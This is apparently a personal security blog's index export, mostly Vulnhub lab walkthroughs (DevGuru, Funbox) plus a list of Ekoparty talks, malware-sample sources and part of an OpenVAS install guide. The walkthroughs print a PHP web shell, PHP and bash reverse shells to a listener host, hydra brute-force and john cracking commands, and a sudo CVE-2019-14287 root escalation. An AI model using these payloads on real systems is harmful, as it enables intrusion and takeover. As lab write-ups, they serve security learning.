┌──(root💀kali)-[/home/tiago/apps/tools/ffuf_1.1.0_linux_amd64] └─# ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.63/FUZZ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : GET :: URL : http://192.168.0.63/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ .htaccess [Status: 200, Size: 1678, Words: 282, Lines: 53] 0 [Status: 200, Size: 12664, Words: 929, Lines: 331] About [Status: 200, Size: 18656, Words: 977, Lines: 478] Services [Status: 200, Size: 10026, Words: 815, Lines: 267] about [Status: 200, Size: 18656, Words: 977, Lines: 478] backend [Status: 302, Size: 406, Words: 60, Lines: 12] config [Status: 301, Size: 313, Words: 20, Lines: 10] modules [Status: 301, Size: 314, Words: 20, Lines: 10] plugins [Status: 301, Size: 314, Words: 20, Lines: 10] services [Status: 200, Size: 10026, Words: 815, Lines: 267] storage [Status: 301, Size: 314, Words: 20, Lines: 10] themes [Status: 301, Size: 313, Words: 20, Lines: 10] vendor [Status: 301, Size: 313, Words: 20, Lines: 10] :: Progress: [20469/20469] :: Job [1/1] :: 97 req/sec :: Duration: [0:03:30] :: Errors: 0 ::┌──(tiago㉿kali)-[~/apps/tools/ffuf_1.1.0_linux_amd64] └─$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.63:8585/FUZZ 127 ⨯ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : GET :: URL : http://192.168.0.63:8585/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ admin [Status: 302, Size: 34, Words: 2, Lines: 3] avatars [Status: 302, Size: 31, Words: 2, Lines: 3] css [Status: 302, Size: 27, Words: 2, Lines: 3] debug [Status: 200, Size: 160, Words: 18, Lines: 5] explore [Status: 302, Size: 37, Words: 2, Lines: 3] fonts [Status: 302, Size: 29, Words: 2, Lines: 3] frank [Status: 200, Size: 11236, Words: 968, Lines: 345] healthcheck [Status: 200, Size: 26, Words: 4, Lines: 2] img [Status: 302, Size: 27, Words: 2, Lines: 3] issues [Status: 302, Size: 34, Words: 2, Lines: 3] js [Status: 302, Size: 26, Words: 2, Lines: 3] milestones [Status: 302, Size: 34, Words: 2, Lines: 3] notifications [Status: 302, Size: 34, Words: 2, Lines: 3] vendor [Status: 302, Size: 30, Words: 2, Lines: 3] :: Progress: [20469/20469] :: Job [1/1] :: 346 req/sec :: Duration: [0:00:59] :: Errors: 0 :: Nuclei &nbsp; Back to nikto look at those git files available to us. The same can be achieved with nuclei.
./nuclei -l urls.txt -t nuclei-templates/files/ -o results.txt Git-dumper &nbsp; Now we can dump it easily with git-dumper on folder devguru.
./git-dumper.py http://192.168.0.63/.git devguruInside devguru folder, you&rsquo;ll finde only .git file. Let&rsquo;s analyse it and checkout to last commit.
git log --pretty=oneline git log --pretty=format:&#34;%h %s&#34; --graph Now checkout to commit and list it&rsquo;s content.
git checkout 7de9115 ls Looking for password in config folder.
fgrep -r password config/ &#39;mysql&#39; =&gt; [ &#39;driver&#39; =&gt; &#39;mysql&#39;, &#39;engine&#39; =&gt; &#39;InnoDB&#39;, &#39;host&#39; =&gt; &#39;localhost&#39;, &#39;port&#39; =&gt; 3306, &#39;database&#39; =&gt; &#39;octoberdb&#39;, &#39;username&#39; =&gt; &#39;october&#39;, &#39;password&#39; =&gt; &#39;SQ66EBYx4GT3byXH&#39;, &#39;charset&#39; =&gt; &#39;utf8mb4&#39;, &#39;collation&#39; =&gt; &#39;utf8mb4_unicode_ci&#39;, &#39;prefix&#39; =&gt; &#39;&#39;, &#39;varcharmax&#39; =&gt; 191, ],Look at the path adminer.php, sounds interesting.
The database Adminer has its version as 4.7.7, giving me suggestion to update to 4.7.8. Maybe some vulnerability ahead.
Verifying MySQL version
SHOW VARIABLES LIKE &#34;%version%&#34; Looking at user table.
Create a bcrypt password. Take care with the amount of rounds, I used 10 rounds.
Password GetShell
Clone Frank user line and create yours with your own user.
Now you can login with your user.
October CMS Version 1.0.1
🚪🚶 Foothold &nbsp; Once logged into October, we can add a malicious php code to be executed when the page loaded. Let&rsquo;s do it in Home page. First create a malicious markup which will call out php code.
Now insert the malicious code.
function onStart()  $this-&gt;page[&#34;PoisonVar&#34;] = system($_GET[&#39;cmd&#39;]); Save it and run a command through cmd.
This is the response of the listed directory.
Time to inject a command in cmd and get our first shell.
php -r &#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;Now just wait for the connection.
┌──(root💀kali)-[/home/tiago] └─# rlwrap nc -nlvp 1234 listening on [any] 1234 . Spawning a better shell
python3.6 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;cd /tmp wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh -s -k keyword -r report -e /tmp/ -tLinEnum script found some interesting backup files.
less app.ini.bak [database] : ; Database to use. Either &#34;mysql&#34;, &#34;postgres&#34;, &#34;mssql&#34; or &#34;sqlite3&#34;. : DB_TYPE = mysql : HOST = 127.0.0.1:3306 : NAME = gitea : USER = gitea : ; Use PASSWD = \`your password\` for quoting if you use special characters in the : password. : PASSWD = UfFPTF8C8jjxVF2m The only way I found to reproduce such hash was taking advantage of this opensource project, reading the code and adapting it to a simple golang program.
https://github.com/go-gitea/gitea/blob/master/models/user.go#L379-L397
//https://medium.com/rungo/how-to-write-a-simple-go-program-13fd104f3018 //https://godoc.org/golang.org/x/crypto/pbkdf2 package main import ( &#34;crypto/sha256&#34; &#34;golang.org/x/crypto/pbkdf2&#34; &#34;fmt&#34; ) func main() var passwd []byte passwd = pbkdf2.Key([]byte(&#34;0xtiago&#34;), []byte(&#34;MaaahOeeee&#34;), 10000, 50, sha256.New) fmt.Println(fmt.Sprintf(&#34;%x&#34;,passwd)) Installing dependency and running the program.
$ go get golang.org/x/crypto/pbkdf2 $ go run hash.go f1eb1933069a3552722c29faeeeb1271e2e66c0eae8646201df479f90c99fa4075e8c568852a7a54b7665c3e760911706509Now just clone the table line and create a new user with the hash and salt.
\\o/
$ ps aux | grep giteaGitea process is running as frank user.
Create a new repository and add a reverse shell script on post-receive Git hook.
Then i just had to clone and commit a new change like the example bellow, and received the shell back.
$ git clone http://devguru.local:8585/tiago/Teste.git $ cd Teste $ touch test.txt $ git add . $ git commit -am &#34;Primeiro commmit&#34; $ git push origin master 🛡️ Privilege Escalation &nbsp; One of the first thing to do during the enumeration is check the permissions I have executing something as root, like sudo -l.
I can run sqlite3 as root, but it will ask frank password for this, but we don&rsquo;t have this information. Verifying sudo version, I figured out that is vulnerable to privilege escalation, as says CVE-2019-14287.
From now on I used this to references:
https://www.exploit-db.com/exploits/47502 https://sqlite.org/cli.html Time to become root.
sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/bash&#39; 🍻 Complete &nbsp; root@devguru:/root# cat msg.txt cat msg.txt Congrats on rooting DevGuru! Contact me via Twitter @zayotic to give feedback! root@devguru:/root# cat root.txt cat root.txt 96440606fb88aa7497cde5a8e68daf8f`}).add({id:52,tag:"en",href:"/tags/docker/",title:"Docker",description:"",content:""}).add({id:53,tag:"en",href:"/tags/ekoparty/",title:"Ekoparty",description:"",content:""}).add({id:54,tag:"en",href:"/blog/ekoparty13/",title:"Ekoparty Security Conference 13 (2017) - Talks",description:"Desde 2017, estive presente todos os anos em Buenos Aires para participar do evento, que sempre me suepreende com o ótimo nível dos materiais apresentados pelos palestrantes.",content:`Na busca por algumas palestras específicas que gostaria de assistir novamente, resolvi organizar todas as &ldquo;charlas&rdquo; por categoria, ajudando aqueles que se interessam por assuntos específicos. 😉
Enjoy!📺
Playlist por categoria &nbsp; Playlist por categoria Application Reverse Engineering Pwned in Translation - from Subtitles to RCE by Omri Herscovici &amp; Omer Gull The Java soothsayer: A practical application for insecure randomness vulnerabilities. -Alejo Popovici Blockchain Automatic bugfinding for the blockchain - Felipe Manzano &amp; Josselin Feist Car Hacking Inseguridad en alarmas para vehiculos - Leandro Ferrari The Bicho: An Advanced Car Backdoor Maker - Sheila Berta &amp; Claudio Caracciolo Hardware Hacking Turning hard disk drives into accidental microphones - Alfredo Ortega Internet Of Things (IoT) Hacking Robots Before Skynet - Lucas Apa &amp; Cesar Cerrudo Industrial Control Systems Industroyer: biggest threat to industrial control systems since Stuxnet - Robert Lipovsky Malware Analysis Ruler - From Exchange to DA by Etienne Stalmans Mobile Blue Pill for your phone - Oleksandr Bazhaniuk Bypass Android Hack - Marcelo Romero Inside Android’s SafetyNet Attestation: Attack and Defense - Collin Mulliner Unbox Your Phone - Exploring and Breaking Samsung&rsquo;s TrustZone Sandboxes - Daniel Komaromy POS (Point of Sales) Get to the Money: Hacking POS and POP Systems - Dmitry Chastuhin OS Reverse Engineering Abusing GDI for ring0 exploit primitives: Evolution - Nicolas Economou How to cook Cisco: Exploit Development for Cisco IOS - George Nosenko The Apple of your EFI: An analysis of the state of Apple’s EFI Security Support - Rich Smith &amp; Pepijn Bruienne The &ldquo;Bird&rdquo; That Killed Arbitrary Code Guard - Alex Ionescu Threat Intelligence Rusos, chinos, y todos los que se vengan - Luciano Martins &amp; Ruth Barbacil TOR Exit Nodes en la justicia Argentina Voting Systems (In)security of e-voting in Brazil - Diego Aranha No es una impresora, es una maquina de voto HD - Ignacio Losiggio Panel Voto Electronico Web Application FIESTA: an HTTPS side-channel party Wireless Security 802.11 Protocol Chaos - Andres Blanco Encerramento eko13 - 2017 - Cierre ekoparty security conference #13 Application Reverse Engineering &nbsp; Pwned in Translation - from Subtitles to RCE by Omri Herscovici &amp; Omer Gull &nbsp; The Java soothsayer: A practical application for insecure randomness vulnerabilities. -Alejo Popovici &nbsp; Blockchain &nbsp; Automatic bugfinding for the blockchain - Felipe Manzano &amp; Josselin Feist &nbsp; Car Hacking &nbsp; Inseguridad en alarmas para vehiculos - Leandro Ferrari &nbsp; The Bicho: An Advanced Car Backdoor Maker - Sheila Berta &amp; Claudio Caracciolo &nbsp; Hardware Hacking &nbsp; Turning hard disk drives into accidental microphones - Alfredo Ortega &nbsp; Internet Of Things (IoT) &nbsp; Hacking Robots Before Skynet - Lucas Apa &amp; Cesar Cerrudo &nbsp; Industrial Control Systems &nbsp; Industroyer: biggest threat to industrial control systems since Stuxnet - Robert Lipovsky &nbsp; Malware Analysis &nbsp; Ruler - From Exchange to DA by Etienne Stalmans &nbsp; Mobile &nbsp; Blue Pill for your phone - Oleksandr Bazhaniuk &nbsp; Bypass Android Hack - Marcelo Romero &nbsp; Inside Android’s SafetyNet Attestation: Attack and Defense - Collin Mulliner &nbsp; Unbox Your Phone - Exploring and Breaking Samsung&rsquo;s TrustZone Sandboxes - Daniel Komaromy &nbsp; POS (Point of Sales) &nbsp; Get to the Money: Hacking POS and POP Systems - Dmitry Chastuhin &nbsp; OS Reverse Engineering &nbsp; Abusing GDI for ring0 exploit primitives: Evolution - Nicolas Economou &nbsp; How to cook Cisco: Exploit Development for Cisco IOS - George Nosenko &nbsp; The Apple of your EFI: An analysis of the state of Apple’s EFI Security Support - Rich Smith &amp; Pepijn Bruienne &nbsp; The &ldquo;Bird&rdquo; That Killed Arbitrary Code Guard - Alex Ionescu &nbsp; Threat Intelligence &nbsp; Rusos, chinos, y todos los que se vengan - Luciano Martins &amp; Ruth Barbacil &nbsp; TOR Exit Nodes en la justicia Argentina &nbsp; Voting Systems &nbsp; (In)security of e-voting in Brazil - Diego Aranha &nbsp; No es una impresora, es una maquina de voto HD - Ignacio Losiggio &nbsp; Panel Voto Electronico &nbsp; Web Application &nbsp; FIESTA: an HTTPS side-channel party &nbsp; Wireless Security &nbsp; 802.11 Protocol Chaos - Andres Blanco &nbsp; Encerramento &nbsp; eko13 - 2017 - Cierre ekoparty security conference #13 &nbsp;`}).add({id:55,tag:"en",href:"/blog/faustaoinvader/",title:"Faustao Invader",description:"Faustão Invader - A shooter game created during the coronavirus quarantine. 😷",content:`Da série “😷 Durante a quarentena“.
Por semana gasto cerca de 12 horas em transporte público para ir e voltar do trabalho. Nesta quarentena ganhei horas extras para estudar mais coisas do meu interesse e fazer molecagem. Assim acabo de criar a primeira versão do Faustão Invader, feito em Python3 e Pygame.
Você pode baixar o código disponível no Github e executar conforme as instruções: https://github.com/0xtiago/FaustaoInvader
Este é um dos projetos do livro que estou lendo, o “Python Crash Course”.`}).add({id:56,tag:"en",href:"/tags/faust%C3%A3o-invader/",title:"Faustão Invader",description:"",content:""}).add({id:57,tag:"en",href:"/blog/freemalwaresamples/",title:"Fontes de amostra de malwares para pesquisadores",description:"Fontes de malware frequentemente utilizados por pesquisadores para engenharia reversa e deselvolvimento de defesas.",content:`Pesquisadores de malware frequentemente procuram amostras de malware para analisar técnicas de ameaças e desenvolver defesas. Além de baixar amostras de URLs maliciosos conhecidos, os pesquisadores podem obter amostras de malware das seguintes fontes gratuitas:
ANY.RUN: Necessário cadastro Contagio Malware Dump: Necessário senha CAPE Sandbox Das Malwerk FreeTrojanBotnet: Necessário cadastro Hybrid Analysis: Necessário cadastro KernelMode.info: Necessário cadastro MalShare: Necessário cadastro Malware.lu’s AVCaesar: Necessário cadastro Malware DB Objective-See Collection: Mac malware PacketTotal: Malwares em aquivos PCAP SNDBOX: Necessário cadastro theZoo aka Malware DB URLhaus: Links para sites ativos que estão hospedando malware VirusBay: Necessário cadastro Virusign VirusSign: Necessário cadastro Cuidado para não se infectar ao acessar e testar estes artefatos maliciosos.`}).add({id:58,tag:"en",href:"/tags/footpod/",title:"Footpod",description:"",content:""}).add({id:59,tag:"en",href:"/tags/forerunner/",title:"Forerunner",description:"",content:""}).add({id:60,tag:"en",href:"/blog/funbox_vulnhub/",title:"Funbox: 1 - Vulnhub ",description:"Funbox: 1 - A Vulnhub vulnerable machine walkthrough.",content:`Table of contents &nbsp; Table of contents 🔎 Enumeration 🚪🚶 Foothold 🛡️ Privilege Escalation 🍻 Complete 🔎 Enumeration &nbsp; root@kali:~# nmap -sV -A -O 192.168.0.55 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 15:56 -03 Nmap scan report for 192.168.0.55 Host is up (0.00041s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/secret/ |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://funbox.fritz.box/ |_https-redirect: ERROR: Script execution failed (use -d to debug) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4.37 OS details: DD-WRT v24-sp2 (Linux 2.4.37) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTrying to connect to FTP service with anonymous user. No way&hellip; =(
root@kali:~# lftp 192.168.0.55 lftp 192.168.0.55:~&gt; ls \`ls&#39; at 0 [530 Login incorrect.]Let&rsquo;s try HTTP service.
root@kali:~# ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.55/FUZZ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v0.12 ________________________________________________ :: Method : GET :: URL : http://192.168.0.55/FUZZ :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10] .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10] robots.txt [Status: 200, Size: 19, Words: 2, Lines: 2] secret [Status: 301, Size: 313, Words: 20, Lines: 10] server-status [Status: 403, Size: 277, Words: 20, Lines: 10] wp-admin [Status: 301, Size: 315, Words: 20, Lines: 10] wp-includes [Status: 301, Size: 318, Words: 20, Lines: 10] wp-content [Status: 301, Size: 317, Words: 20, Lines: 10] :: Progress: [20469/20469] :: 553 req/sec :: Duration: [0:00:37] :: Errors: 0 :: When I tried to access http, I had name problems, due the configuration of wordpress. It always converts from the IP to http://funbox.fritz.box. So, I had to input the site domain on file Linux in hosts file.
vim /etc/hostsAdd funbox.fritz.box
Now it\`s possible to access the site.
First thing I do when I reach a Wordpress page, is to enumerate everything with wpscan.
wpscan -e vp,vt,u --url http://funbox.fritz.box/ Unfortunately it couldn&rsquo;t find any vulnerable plugin or something, but the users allowed to login, admin and joe.
Let\`s try some bruteforcing. Our attempts will be on FTP, SSH and Wordpress login page.
First thing is to create a wordlist based on the site content with cewl
cewl http://funbox.fritz.box -d 5 -m 4 -w funbox_wordlist.txt -d - subdirectories depth -m - Minimum word characters. We will start our tries with Hydra, in order to make it easier I&rsquo;ll insert both users in a file users.txt
FTP: No good results.
hydra -V -L users.txt -P funbox_wordlist.txt ftp://192.168.0.55SSH: No good results.
hydra -V -L users.txt -P funbox_wordlist.txt ssh://192.168.0.55Wordpress: No good results.
hydra -V -L users.txt -P funbox_wordlist.txt funbox.fritz.box -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Ffunbox.fritz.box%2Fwp-admin%2F&amp;testcookie=1:S=Location&#39;This way I&rsquo;ll try to use an small and good external wordlist:
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/probable-v2-top1575.txt
Starting from the Wordpress, which is faster to crack, we had good results with the user joe.
hydra -V -L users.txt -P probable-v2-top1575.txt funbox.fritz.box -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Ffunbox.fritz.box%2Fwp-admin%2F&amp;testcookie=1:S=Location&#39; Logged with user joe, but without admin permissions. This way is not possible to upload a shell payload.
With the same credentials I tried FTP and SSH.
FTP ✔️
root@kali:~# lftp 192.168.0.55 lftp 192.168.0.55:~&gt; login joe Password: lftp joe@192.168.0.55:~&gt; ls -rw------- 1 joe joe 998 Jul 18 09:49 mbox lftp joe@192.168.0.55:~&gt; cat mbox From root@funbox Fri Jun 19 13:12:38 2020 Return-Path: &lt;root@funbox&gt; X-Original-To: joe@funbox Delivered-To: joe@funbox Received: by funbox.fritz.box (Postfix, from userid 0) id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC) Subject: Backups To: &lt;joe@funbox&gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: &lt;20200619131238.2D257446B0@funbox.fritz.box&gt; Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC) From: root &lt;root@funbox&gt; Hi Joe, please tell funny the backupscript is done. From root@funbox Fri Jun 19 13:15:21 2020 Return-Path: &lt;root@funbox&gt; X-Original-To: joe@funbox Delivered-To: joe@funbox Received: by funbox.fritz.box (Postfix, from userid 0) id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC) Subject: Backups To: &lt;joe@funbox&gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: &lt;20200619131521.8E2D4446B0@funbox.fritz.box&gt; Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC) From: root &lt;root@funbox&gt; Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you. 1028 bytes transferred 🚪🚶 Foothold &nbsp; Continuing in the last session, it was possible to login with SSH.
SSH ✔️
root@kali:~# ssh joe@192.168.0.55 joe@192.168.0.55&#39;s password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64) ... joe@funbox:~$ ls -lh total 4.0K -rw------- 1 joe joe 998 Jul 18 09:49 mbox joe@funbox:~$ Here we have some limited shell. Due this we need to use python spawn.
joe@funbox:~$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;Looking at /home directory, we find the funny user folder, which can be find at /etc/passd file.
In his folder we have a html.tar file. Lets check it.
joe@funbox:/home/funny$ ls -la total 47608 drwxr-xr-x 3 funny funny 4096 Jul 18 10:02 . drwxr-xr-x 4 root root 4096 Jun 19 11:50 .. -rwxrwxrwx 1 funny funny 55 Jul 18 10:15 .backup.sh -rw------- 1 funny funny 1462 Jul 18 10:07 .bash_history -rw-r--r-- 1 funny funny 220 Feb 25 12:03 .bash_logout -rw-r--r-- 1 funny funny 3771 Feb 25 12:03 .bashrc drwx------ 2 funny funny 4096 Jun 19 10:43 .cache -rw-rw-r-- 1 funny funny 48701440 Aug 12 00:38 html.tar -rw-r--r-- 1 funny funny 807 Feb 25 12:03 .profile -rw-rw-r-- 1 funny funny 162 Jun 19 14:13 .reminder.sh -rw-rw-r-- 1 funny funny 74 Jun 19 12:25 .selected_editor -rw-r--r-- 1 funny funny 0 Jun 19 10:44 .sudo_as_admin_successful -rw------- 1 funny funny 7791 Jul 18 10:02 .viminfoHere we have a backup of wordpress site, including all configuration files.
wp-config.php
Now we can access MySQL and look at users table.
joe@funbox:/tmp$ mysql -u wordpress -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 3400 Server version: 8.0.21-0ubuntu0.20.04.4 (Ubuntu) Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | wordpress | +--------------------+ 2 rows in set (0.02 sec) mysql&gt; use wordpress; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql&gt; show tables; +-----------------------+ | Tables_in_wordpress | +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql&gt; select * from wp_users; +----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+ | 1 | admin | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1 | admin | funny@funbox.box | | 2020-06-19 11:32:16 | | 0 | admin | | 2 | joe | $P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1 | joe | joe@funbox.box | | 2020-06-19 11:46:42 | 1592567203:$P$B7eKG/1s3GPGXCUM/h.lmWqaZ2Udvq1 | 0 | joe miller | +----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+ 2 rows in set (0.00 sec) mysql&gt; With the admin hash ( $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1), it was possible to crack it with John the ripper.
root@kali:~# john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status iubire (?) 1g 0:00:00:00 DONE (2020-08-11 21:26) 16.66g/s 12800p/s 12800c/s 12800C/s jeffrey..james1 Use the &#34;--show --format=phpass&#34; options to display all of the cracked passwords reliably Session completedI could successfully access the admin profile with password iubire in Wordpress, only. It was just a rabbit hole. =( No new information to explore here, and no need to upload a shell payload.
🛡️ Privilege Escalation &nbsp; The other interesting file found at funny directory is .backup.sh, which is world-writable.
I realized that a backup was being made every minute.
joe@funbox:/home/funny$ ls -lh total 47M -rw-rw-r-- 1 funny funny 47M Aug 12 00:48 html.tar joe@funbox:/home/funny$ date Wed 12 Aug 2020 12:48:15 AM UTC 🍻 Complete &nbsp; I appended the following line with a Python reverse shell in .backup.sh , and wait for one minute with a netcat listening port in Kali (192.168.0.56).
/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.56/8080 0&gt;&amp;1 Actually it wasn&rsquo;t every minute, but it was executed every two minutes with user funny, and every five minutes with root user.
At the first try I could get root shell, but during the writing of this post and replicating the steps for screenshots, I got funny user shell. WTF???? And I stood for a long time until get root shell again.
This way to had to use a tool which I never had used before, pspy.
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 chmod +x pspy64 ./pspy64 -d /home/funny Looking at each crontab, we call see the schedules.
crontab -u funny -l crontab -u root -l`}).add({id:61,tag:"en",href:"/tags/games/",title:"Games",description:"",content:""}).add({id:62,tag:"en",href:"/tags/garmin/",title:"Garmin",description:"",content:""}).add({id:63,tag:"en",href:"/blog/gestao-de-vulnerabilidades-com-greenbone-openvas/",title:"Gestão de vulnerabilidades com Greenbone Openvas - Ubuntu 20.04",description:"Um rápido how-to de como instalar o Greenbone Openvas no Ubuntu 20.04, além de uma breve introdução a gestão de vulnerabilidades.  ",content:`🚫 Alerta &nbsp; &nbsp; Este post está desatualizado, e poderá ter alguns problemas na utilização do OpenVAS. Sugiro ir ao novo post para ter a experiência esperada: https://tiagotavares.io/2021/12/gestao-de-vulnerabilidades-com-greenbone-openvas-ubuntu-20.04-updated-dez-2021 Sumário &nbsp; Sumário Introdução Por quê gerir vulnerabilidades e como fazer isso Um pouco de história Instalação e Configuração Instalação do Postgresql Instalação do Openvas Configuração do Redis Configuração do Postgressql Atualização dos feeds ☕ Configurando cron para atualização dos feeds diariamente Atualizando certificados Configurando o GSA (Web Interface) para acesso externo Reconstruindo NVT db Deu pau? Olhe os logs! 🎁 Bônus - Máquina Virtual Introdução &nbsp; Neste post vou passar alguns passos e possíveis armadilhas a serem evitadas para instalação do Openvas, que é um scanner de vulnerabilidades opensource que pode auxiliar seu time na detecção de riscos em seus ativos tecnológicos.
Outra motivação é poder ajudar todas as comunidades que possuem o Português como língua mãe. 🇵🇹 🇧🇷 🇦🇴 🇹🇱 🇲🇿 🇨🇻 🇬🇶 🇬🇼 🇸🇹
Os componentes a serem instalados serão:
OpenVas (Open Vulnerability Assessment Scanner) 20.8 - Scanner de Vulnerabilidades; GVM (Greenbone Vulnerability Manager) 20.8 - Responsável por gerenciar as tasks de scan; GSA (Greenbone Security Assistant) 20.8 - Responsável por prover a interface web para gestão do usuário; Outros componentes auxiliares e bibliotecas. Por quê gerir vulnerabilidades e como fazer isso &nbsp; A gestão de vulnerabilidades, apesar de ser apenas uma parte dos seus processos de Gestão de Segurança da Informaçâo, ela é de extrema importância para ter visibilidades dos riscos em seu ambiente.
Algumas boas referências da importância desses processos podem ser encontrados em:
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf https://www.cisecurity.org/controls/continuous-vulnerability-management/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf Suriro os seguintes passos para uma boa gestão de vulnerabilidades seja conduzida:
Ter uma lista de todos os ativos de sua organização, assim como domínios e subdomínios, redes externas e internas; Saber quais são os seus ativos críticos para o funcionamento da organização; Manter a lista de ativos suas criticidades atualizadas; Organizar as agendas de scan destes ativos; Realizar análise e triagem dos relatórios destes scans, além de avaliar possíveis falsos positivos; Reportar vulnerabilidades, dando ênfase em vulnerabilidades altas e críticas, e riscos em ativos críticos; Realizar follow-ups periódicos com os times responsáveis pelas correções; Voltar ao item 3. Um pouco de história &nbsp; Em 2005, os desenvolvedores do scanner de vulnerabilidade Nessus decidiram descontinuar o trabalho em modelo opensource e mudar para um modelo de negócios proprietário.
Neste ponto, os desenvolvedores da Intevation e DN-Systems - as duas empresas que mais tarde fundariam a Greenbone Networks - já estavam contribuindo com desenvolvimentos para o Nessus, com foco em ferramentas de cliente. Os trabalhos foram apoiados principalmente pelo Escritório Federal Alemão de Segurança da Informação (BSI).
Instalação e Configuração &nbsp; Tudo o que será feito abaixo será com base em um repositório pronto para o Ubuntu. Mas se você quiser pode baixar os fontes, compilar e configurar da forma que quiser, basta acessar o repositório da Greenbone no Github: https://github.com/greenbone/
Vamos utilzar o repositório criado por Mohammad Razavi.
https://launchpad.net/~mrazavi/+archive/ubuntu/gvm
